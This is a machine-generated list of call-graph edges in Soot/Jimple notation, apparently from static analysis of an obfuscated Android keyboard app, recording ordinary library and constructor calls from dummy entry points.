CLINIT edge: staticinvoke <ivw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ivw: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lvr: boolean equals(java.lang.Object)>($r4) in <lvt: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void f(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void f(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Throwable: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>(0) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i2) in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r8) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r6.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i0, $r1, $i1, $i2) in <lly: lma g()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: int size()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
SPECIAL edge: specialinvoke $r0.<lak: void <init>(byte[])>(null) in <lsu: void <clinit>()> ==> <lak: void <init>(byte[])>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ing: void <init>(java.lang.String,iec)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r11 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r7, $r8) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("] was already created.") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Multiple entries with same key: ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lmb: void <init>()>() in <lme: lmb g()> ==> <lmb: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnp: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
SPECIAL edge: specialinvoke $r6.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_TRENDING_METADATA", 6, 6) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r9) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
VIRTUAL edge: $r8 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r6, "", $r7, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
SPECIAL edge: specialinvoke $r2.<lvs: void <init>(java.lang.String,int)>("LONG", 2) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getValue()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r4, $i0, $r9) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r5.<lqk: void <init>(java.lang.Object[],int)>($r6, 3) in <ivw: void <clinit>()> ==> <lqk: void <init>(java.lang.Object[],int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lje: boolean hasNext()>() in <lje: java.lang.Object next()> ==> <lje: boolean hasNext()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/io/InputStream;", r0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqs: lsa l()> ==> <lkq: lsb B()>
STATIC edge: $i1 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkg: void g(int)> ==> <lkg: int a(int,int)>
STATIC edge: $i0 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljd: int f(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
STATIC edge: $l0 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean z(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i2, 3) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("StickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: $r9 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsn: boolean b(lsr)>($r3) in <lsn: boolean ac()> ==> <lsd: boolean b(lsr)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r0, $r4) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>($r5, $r0, $i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<java.lang.Class: java.lang.String getName()>() in <ojg: void h(java.lang.Throwable)> ==> <java.lang.Class: java.lang.String getName()>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lsz: boolean equals(java.lang.Object)>($r14) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $l1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(3) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r22 = staticinvoke <bel: java.io.InputStream a(java.nio.ByteBuffer)>($r21) in <hbw: java.lang.Object a(java.lang.Object)> ==> <bel: java.io.InputStream a(java.nio.ByteBuffer)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: $i0 = specialinvoke $r2.<lvr: int b()>() in <lvr: void <init>(lvr,lvr)> ==> <lvr: int b()>
SPECIAL edge: specialinvoke $r6.<java.util.NoSuchElementException: void <init>()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqn: void <init>(lkx,java.lang.Object[],int,int)> ==> <lma: void <init>()>
STATIC edge: $r1 = staticinvoke <lme: lma l(java.util.Comparator)>(null) in <lme: void <init>(lkx,int)> ==> <lme: lma l(java.util.Comparator)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i0, $r1, $r2, $r3) in <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r2) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
CLINIT edge: staticinvoke <hnt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnt: void <clinit>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljf: java.lang.Object p()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
VIRTUAL edge: $r12 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(9) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int b(java.lang.Object[],int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>($r0, $r2) in <iye: void D(boolean,java.lang.String,int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" cannot be negative but was: ") in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lid: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<idq: void <init>(java.lang.String,mag)>($r0, $r1) in <idq: idq a(java.lang.String,mag)> ==> <idq: void <init>(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r4 = staticinvoke <kes: java.lang.String k(nfe)>($r27) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void l(int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqr: lsa l()> ==> <lma: lkq k()>
VIRTUAL edge: virtualinvoke $r3.<lli: void c(java.util.Map$Entry)>($r6) in <hbv: void j()> ==> <lli: void c(java.util.Map$Entry)>
SPECIAL edge: specialinvoke r0.<android.app.Application: void <init>()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()> ==> <android.app.Application: void <init>()>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r0) in <ojg: void v(java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
VIRTUAL edge: virtualinvoke $r14.<lkl: void h(java.lang.Object)>($r15) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: void h(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
CLINIT edge: staticinvoke <hbu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbu: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsh: lse h(java.util.logging.Level)>($r2) in <lsh: lsw a(java.util.logging.Level)> ==> <lsh: lse h(java.util.logging.Level)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r2.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r0, $r1, 0, 0) in <lsz: lsz c(java.lang.String,java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.ArrayList: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("tags", $r1, 0) in <lsk: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
CLINIT edge: staticinvoke <ldr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ldr: void <clinit>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: $i0 = specialinvoke r0.<ljf: int n()>() in <ljf: java.util.Set f()> ==> <ljf: int n()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i5) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $r0 = staticinvoke <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>($r1) in <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)> ==> <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
STATIC edge: $i1 = staticinvoke <ql: int a(int[],int,int)>($r1, $i2, 0) in <qj: int j()> ==> <ql: int a(int[],int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r2) in <ljd: int f(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(6) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<ltr: void <init>()>() in <ltr: void <clinit>()> ==> <ltr: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "array") in <ql: int a(int[],int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(2) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segments", class "[Lj$/util/concurrent/o;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: $r3 = specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int z(int,int,int,int)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r28.<mag: void <init>(java.lang.String,int,int)>("TENOR_STICKER_SEARCH_METADATA", 28, 28) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>(4, $i0) in <izw: int ak(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $r3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>($r3, $r4) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>
STATIC edge: $r10 = staticinvoke <lum: lvt k()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lum: lvt k()>
